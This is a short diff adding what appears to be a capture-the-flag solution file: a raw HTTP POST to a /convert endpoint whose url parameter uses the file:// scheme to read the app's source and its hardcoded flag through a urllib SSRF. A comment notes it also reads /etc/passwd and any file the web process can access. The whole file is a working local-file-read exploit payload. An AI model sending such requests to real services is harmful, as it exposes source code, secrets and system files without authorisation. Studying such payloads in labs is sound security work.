@@ -1,0 +1,8 @@
+# LFI via file:// scheme in urllib SSRF. Reads app.py which contains hardcoded FLAG. Also works for /etc/passwd and any file readable by the web process.
+
+POST /convert HTTP/1.1
+Host: 172.17.0.1:55561
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+
+url=file:///proc/self/cwd/app.py
